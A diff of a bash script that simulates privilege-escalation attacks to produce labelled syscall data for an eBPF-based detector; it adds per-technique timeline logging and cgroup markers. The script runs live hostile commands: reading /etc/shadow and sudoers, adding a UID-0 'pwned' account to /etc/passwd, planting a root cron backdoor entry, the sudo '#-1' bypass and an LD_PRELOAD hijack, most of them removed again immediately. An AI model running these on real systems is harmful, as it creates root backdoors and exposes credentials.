@@ -1,25 +1,6 @@
 #!/bin/bash
 # Attack Simulation Script for eBPF Data Collection  
 #
-# Generates diverse privilege-escalation-like syscall patterns.
-# Loops continuously for a configurable duration (default 5 minutes).
-#
-# v4 adds: SUID discovery, sudo misconfiguration abuse, cron/systemd
-# persistence tampering, LD_PRELOAD hijacking, writable /etc/passwd
-# exploitation, and a web-shell-style sudden shell spawn — techniques
-# missing from v3's coverage (which was mostly setuid/ptrace/namespace/
-# capset patterns). v4 also rebalances single-shot vs. looped attacks:
-# real exploits usually call setuid(0) once, not fifty times in a loop —
-# if bursty patterns dominate the attack class, the model risks learning
-# "repeated privilege syscalls" as the signal instead of "a privilege
-# syscall happened in a suspicious context at all," which would miss
-# realistic single-shot attacks. Most v4 additions are single-shot.
-#
-# All C payloads are compiled ONCE up front, then just executed on every cycle 
-#
-# Run in a SEPARATE terminal while:  collector.py --label attack
-#
-# Usage:
 #   sudo bash simulate_attacks.sh              # 300s default
 #   sudo bash simulate_attacks.sh --duration 600  # 10 minutes
 #
@@ -265,6 +246,34 @@ touch "$WORKDIR/fake_suid_binary"
 echo "  Build complete."
 echo
 
+# Each line: technique<TAB>start_epoch<TAB>end_epoch (wall clock).
+# The offline labeler (label_interleaved.py) intersects these windows with
+# each event's timestamp_human to attribute attack events to a technique,
+# giving the per-technique detection breakdown. Written OUTSIDE $WORKDIR so
+# the exit trap does not delete it; override the path with PE_TIMELINE.
+
+TIMELINE="${PE_TIMELINE:-/tmp/pe_technique_timeline.tsv}"
+: > "$TIMELINE"
+echo "[*] Technique timeline → $TIMELINE"
+tstart() { _TECH="$1"; _T0=$(date +%s.%N); }
+tend()   { printf '%s\t%s\t%s\n' "$_TECH" "$_T0" "$(date +%s.%N)" >> "$TIMELINE"; }
+
+
+# bpf_get_current_cgroup_id() (recorded per event by the collector) returns
+# the kernfs inode of the task's cgroup directory; `stat -c %i` of that same
+# directory gives the identical number. Writing it here lets the labeler mark
+# exactly the events that came from this attack run. Cleanest when the whole
+# script runs inside a dedicated cgroup (see run_attack_scoped.sh).
+
+CGROUP_MARKER="${PE_CGROUP_MARKER:-/tmp/pe_attack_cgroup.txt}"
+_cg_rel=$(awk -F: '/^0::/{print $3}' /proc/self/cgroup 2>/dev/null)
+if [ -n "$_cg_rel" ] && [ -d "/sys/fs/cgroup${_cg_rel}" ]; then
+    stat -c %i "/sys/fs/cgroup${_cg_rel}" > "$CGROUP_MARKER"
+    echo "[*] Attack cgroup id → $(cat "$CGROUP_MARKER")  (marker: $CGROUP_MARKER)"
+else
+    echo "[warn] could not resolve cgroup id; labeler will need --attack-cgroup manually"
+fi
+
 START_TIME=$(date +%s)
 CYCLE=0
 sleep 2  # Give collector time to attach
@@ -277,37 +286,46 @@ while true; do
     fi
     echo "[cycle $((CYCLE+1)) | ${ELAPSED}s / ${DURATION}s elapsed]"
 
-    # 1. SUID Program Exploitation Pattern (single-shot) 
+    # 1. SUID Program Exploitation Pattern (single-shot)
     echo "[1/14] Simulating SUID privilege escalation pattern..."
+    tstart suid_exploit
     "$WORKDIR/suid_exploit" || true
+    tend
     echo "  Done."
     echo
 
     # 2. Rapid setuid/setgid Chain (bursty)
     echo "[2/14] Simulating rapid setuid/setgid syscall chain..."
+    tstart rapid_chain
     "$WORKDIR/rapid_chain" || true
+    tend
     echo "  Done."
     echo
 
-    # 3. Slow / Stealthy Attack Pattern 
+    # 3. Slow / Stealthy Attack Pattern
     # Mimics an attacker who spaces out calls to avoid rate-based detection
     echo "[3/14] Simulating slow/stealthy privilege changes..."
+    tstart stealthy
     "$WORKDIR/stealthy" || true
+    tend
     echo "  Done."
     echo
 
-    # ── 4. SUID Binary Discovery + Recon (single-shot) ────────────────
+    # 4. SUID Binary Discovery + Recon 
     # Bounded to standard binary dirs (maxdepth 1, no recursion) — a real
     # attacker checks PATH-like locations first anyway.
     echo "[4/14] Simulating SUID binary discovery..."
+    tstart suid_discovery
     timeout 2 find /usr/bin /usr/sbin /bin /sbin /usr/local/bin \
         -maxdepth 1 -perm -4000 -type f 2>/dev/null \
         | head -5 > "$WORKDIR/suid_candidates.txt" || true
+    tend
     echo "  Done."
     echo
 
-    # 5. Sensitive File Access 
+    # 5. Sensitive File Access
     echo "[5/14] Simulating suspicious file access patterns..."
+    tstart sensitive_file_access
     cat /etc/shadow    2>/dev/null | head -3 || true
     cat /etc/sudoers   2>/dev/null | head -3 || true
     cat /etc/gshadow   2>/dev/null | head -3 || true
@@ -315,51 +333,62 @@ while true; do
     cat /proc/kallsyms 2>/dev/null | head -5 || true
     cat /proc/kcore    2>/dev/null | head -c 1 || true
     echo "test" > /etc/pe_test_file 2>/dev/null && rm /etc/pe_test_file 2>/dev/null || true
+    tend
     echo "  Done."
     echo
 
-    # 6. Suspicious chmod/chown Operations 
+    # 6. Suspicious chmod/chown Operations
     echo "[6/14] Simulating suspicious permission changes..."
+    tstart chmod_chown
     chmod 4755 "$WORKDIR/fake_suid_binary" 2>/dev/null || true
     chmod 2755 "$WORKDIR/fake_suid_binary" 2>/dev/null || true
     chmod 6755 "$WORKDIR/fake_suid_binary" 2>/dev/null || true
     chown root:root "$WORKDIR/fake_suid_binary" 2>/dev/null || true
     chown root:root /tmp/.test_chown 2>/dev/null || true
     chmod 777 /tmp/.test_chown 2>/dev/null || true
+    tend
     echo "  Done."
     echo
 
-    # 7. ptrace / Process Injection Pattern 
+    # 7. ptrace / Process Injection Pattern
     echo "[7/14] Simulating ptrace and process manipulation..."
+    tstart ptrace
     "$WORKDIR/ptrace_sim" || true
     # Rapid clone/fork burst
     for i in $(seq 1 20); do /bin/true & done
     wait
+    tend
     echo "  Done."
     echo
 
     # 8. Namespace / Unshare Manipulation
     echo "[8/14] Simulating namespace escape attempts..."
+    tstart namespace
     # unshare requires root, will fail as non-root — generates the syscall
     unshare --user /bin/id 2>/dev/null || true
     unshare --pid  /bin/id 2>/dev/null || true
     unshare --net  /bin/id 2>/dev/null || true
     "$WORKDIR/namespace_sim" || true
+    tend
     echo "  Done."
     echo
 
     # 9. capset / prctl Manipulation
     echo "[9/14] Simulating capability and process attribute manipulation..."
+    tstart capset_prctl
     "$WORKDIR/capset_sim" 2>/dev/null || true
+    tend
     echo "  Done."
     echo
 
-    # 10. Sudo Misconfiguration Abuse (single-shot) 
+    # 10. Sudo Misconfiguration Abuse (single-shot)
     # -n = non-interactive: fail immediately instead of prompting for a password, so the script never hangs waiting for input.
     echo "[10/14] Simulating sudo misconfiguration abuse..."
+    tstart sudo_misconfig
     sudo -n -l 2>/dev/null | head -5 || true
     sudo -n -u '#-1' /bin/sh -c id 2>/dev/null || true
     sudo -n /bin/sh -c 'id' 2>/dev/null || true
+    tend
     echo "  Done."
     echo
 
@@ -369,19 +398,23 @@ while true; do
     # so the cron daemon never has time to act on it.
 
     echo "[11/14] Simulating cron/systemd persistence tampering..."
+    tstart cron_persistence
     crontab -l 2>/dev/null || true
     echo "* * * * * root /tmp/.pe_backdoor" > /etc/cron.d/pe_test 2>/dev/null || true
     cat /etc/cron.d/pe_test 2>/dev/null || true
     rm -f /etc/cron.d/pe_test 2>/dev/null || true
-    
+
 
     sed -i '/\/tmp\/\.pe_backdoor/d' /etc/crontab 2>/dev/null || true
+    tend
     echo "  Done."
     echo
 
-    # 12. LD_PRELOAD Hijack (single-shot) 
+    # 12. LD_PRELOAD Hijack (single-shot)
     echo "[12/14] Simulating LD_PRELOAD hijack..."
+    tstart ld_preload
     LD_PRELOAD="$WORKDIR/libhijack.so" /bin/true 2>/dev/null || true
+    tend
     echo "  Done."
     echo
 
@@ -389,22 +422,28 @@ while true; do
     # Append a UID-0 backdoor entry, exercise it, then remove it in the same step.
 
     echo "[13/14] Simulating writable /etc/passwd exploitation..."
+    tstart passwd_write
     echo "pwned:x:0:0:pwned:/root:/bin/bash" >> /etc/passwd 2>/dev/null || true
     su pwned -c id 2>/dev/null || true
 
     # Remove every injected pwned line (also self-heals prior polluted runs)
     sed -i '/^pwned:x:0:0:pwned:\/root:\/bin\/bash$/d' /etc/passwd 2>/dev/null || true
+    tend
     echo "  Done."
     echo
 
     # 14. Web-shell-style Command Injection (single-shot)
     echo "[14/14] Simulating web-shell-style command injection..."
+    tstart webshell
     "$WORKDIR/webshell_sim" || true
+    tend
     echo "  Done."
     echo
 
-    # repeated mini-cycle for a bit more bursty-pattern coverage 
+    # repeated mini-cycle for a bit more bursty-pattern coverage
+    tstart cycle_burst
     "$WORKDIR/cycle" || true
+    tend
 
     CYCLE=$((CYCLE + 1))
 done
